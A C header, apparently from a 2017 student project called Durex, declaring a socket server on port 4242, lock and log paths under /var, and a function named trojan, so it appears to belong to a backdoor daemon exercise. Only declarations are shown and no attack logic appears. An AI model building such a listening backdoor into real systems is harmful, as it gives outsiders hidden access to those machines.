/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 14:25:26 by hivian            #+#    #+#             */
/*   Updated: 2017/06/02 12:26:53 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

# define Xv(err,res,str)	(x_void(err,res,str,__FILE__,__LINE__))
# define X(err,res,str)		(x_int(err,res,str,__FILE__,__LINE__))
# define LOCK_PATH "/var/lock/durex.lock"
# define LOG_PATH "/var/log/durex.log"
# define NB_CLIENTS 3
# define PORT 4242


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

typedef struct sockaddr_in	t_sock_in;

typedef struct				s_env
{
	FILE					*f_logs;
	int 					hsock, csock;
	t_sock_in				haddr;
	socklen_t 				haddr_size;
	int 					bind, listen;
	char					client_ip[INET6_ADDRSTRLEN];
	int						client_port;
}							t_env;

void						trojan(t_env *e);
void						create_server(t_env *e);
void						get_client_ip(t_env *e);

void						signal_handler();
int							x_int(int err, int res, char *str, char *file, int line);
void						*x_void(void *err, void *res, char *str, char *file, int line);

#endif
